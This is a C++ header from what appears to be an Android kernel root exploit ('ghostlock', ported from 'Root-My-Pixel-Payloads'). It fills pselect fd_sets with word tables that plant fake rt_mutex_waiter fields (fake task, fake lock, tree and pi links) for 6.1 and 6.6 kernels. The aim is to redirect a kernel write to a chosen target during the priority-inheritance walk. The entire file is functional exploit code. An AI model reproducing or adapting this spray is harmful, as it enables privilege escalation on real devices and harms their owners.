#pragma once
/** @file jni/pselect_fdsets.hpp
 *  The three helpers that fill the three fd_sets, and the two word tables they fill.
 *
 *  Sources: bddfea4:src/core/fops.c:333-346 (word access, words per set), :348-370 (global
 *  word), :372-375 (waiter shift), :377-389 (waiter word), :431-493 (the tables).
 *
 *  These are pure computation plus fd_set writes, so they stay here instead of becoming seams:
 *  nothing in them touches a file, an environment variable, or a global. The two values they
 *  used to fetch from file scope (the waiter shift and the words per set) arrive as arguments.
 *
 *  The two tables are the whole point of the file. They differ by kernel family, and the
 *  difference is not cosmetic -- the compact table carries the write value in the parents and
 *  the write target in the children, the other one plants the fields of a 6.6 rt_mutex_waiter.
 *  Both comments from the original are kept verbatim below, because they are the only place
 *  that says which kernel each table belongs to.
 */
#include <cstddef>
#include <iterator>
#include <cstdint>
#include <sys/select.h>

#include "jni/route_common.hpp"

namespace ghostlock::jni {
    /** Word access into an fd_set (fops.c:333-340). */
    inline void fdset_put_word(fd_set *set, int word, std::uint64_t value) noexcept {
        auto *bits = reinterpret_cast<unsigned long *>(set);
        bits[word] = static_cast<unsigned long>(value);
    }

    /** One entry of a word table: which waiter word, what value, and its name for the log. */
    struct WaiterWord final {
        int word;
        std::uint64_t value;
        const char *name;
    };

    /**
     *  Place one global word into whichever of the three sets owns it (fops.c:348-370).
     *
     *  @param in out ex        the three sets being built.
     *  @param words_per_set    how many words each fd_set has.
     *  @param global_word      the index across all three sets taken together.
     *  @param value            what to store.
     *  @return true when the word landed in one of the three sets, false when out of range.
     */
    [[nodiscard]] inline bool pselect_put_global_word(fd_set *in, fd_set *out, fd_set *ex,
                                                      int words_per_set, int global_word,
                                                      std::uint64_t value) noexcept {
        if (global_word < 0) {
            return false;
        }
        const int set_idx = global_word / words_per_set;
        const int word_idx = global_word % words_per_set;
        switch (set_idx) {
            case 0:
                fdset_put_word(in, word_idx, value);
                return true;
            case 1:
                fdset_put_word(out, word_idx, value);
                return true;
            case 2:
                fdset_put_word(ex, word_idx, value);
                return true;
            default:
                return false;
        }
    }

    /**
     *  Place one waiter word at the current shift (fops.c:377-389).
     *
     *  @param shift  the waiter shift; the caller supplies it, including its fallback.
     *  @return true when the word landed.
     *  @note The original logged a warning here naming the word when it did not land; the
     *        return value lets the caller decide what to log instead.
     */
    [[nodiscard]] inline bool pselect_put_waiter_word(fd_set *in, fd_set *out, fd_set *ex,
                                                      int words_per_set, std::uint32_t shift,
                                                      const WaiterWord &word) noexcept {
        const int global_word = static_cast<int>(shift) + word.word;
        return pselect_put_global_word(in, out, ex, words_per_set, global_word, word.value);
    }

    /** The compact table (fops.c:452-464). Its two derived values are taken from offsets. */

    /**
     *  Fill the three sets for the compact route (fops.c:445-469), table included.
     *
     *  @param shift   the waiter shift to apply.
     *  @note Comment kept verbatim from the original: "6.1 compact write route
     *        (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry the write value,
     *        children the write target; waiter->task is the payload fake_task (planted fields
     *        for the PI walk). Value writes relink left-only at the target, or the erase
     *        rebalance walks the target page."
     */
    inline void fill_fdsets_compact(fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
                                    std::uint32_t shift, const SprayOffsets &offsets,
                                    const SprayProducts &products, std::uint32_t waiter_prio) noexcept {
        const std::uint64_t relink_pc =
            products.fake_right != 0U ? products.fake_right : offsets.fake_parent;
        const std::uint64_t relink_left =
            products.fake_right != 0U ? offsets.pselect_custom_target : offsets.fake_left;
        const WaiterWord words[] = {
            {2, relink_pc, "tree_pc"},
            {3, 0U, "tree_right"},
            {4, relink_left, "tree_left"},
            {5, relink_pc, "pi_pc"},
            {6, 0U, "pi_right"},
            {7, relink_left, "pi_left"},
            {8, products.fake_task, "task"},
            {9, products.fake_lock, "lock"},
            {10, (static_cast<std::uint64_t>(waiter_prio) << 32U) | 3U, "wake_prio"},
            {11, 0U, "deadline"},
            {12, 0U, "ww_ctx"},
        };
        /* The length is taken from the array, as the original did with
         *  sizeof(words)/sizeof(words[0]); a hand-written count is how this file first got
         *  it wrong. */
        for (std::size_t i = 0U; i < std::size(words); i++) {
            (void) pselect_put_waiter_word(in, out, ex, words_per_set, shift, words[i]);
        }
    }

    /** The non-compact table (fops.c:472-486). */
    [[nodiscard]] inline constexpr std::size_t kRtWordsCount = 13U;

    /**
     *  Fill the three sets for the non-compact route (fops.c:470-492), table included.
     *
     *  @param shift   the waiter shift to apply.
     *  @note Comment kept verbatim from the original: "6.6 rt_mutex_waiter with rb_node
     *        tree/pi_tree".
     */
    inline void fill_fdsets_rt(fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
                               std::uint32_t shift, const SprayProducts &products) noexcept {
        const WaiterWord words[kRtWordsCount] = {
            {2, 0U, "tree_pc"},
            {3, 0U, "tree_right"},
            {4, 0U, "tree_left"},
            {5, 1U, "tree_prio"},
            {6, 0U, "tree_deadline"},
            {7, 0U, "pi_parent"},
            {8, 0U, "pi_right"},
            {9, 0U, "pi_left"},
            {10, 1U, "pi_prio"},
            {11, 0U, "pi_deadline"},
            {12, products.fake_task, "task"},
            {13, products.fake_lock, "lock"},
            {14, 3U, "wake_state"},
        };
        for (std::size_t i = 0U; i < kRtWordsCount; i++) {
            (void) pselect_put_waiter_word(in, out, ex, words_per_set, shift, words[i]);
        }
    }
}  // namespace ghostlock::jni
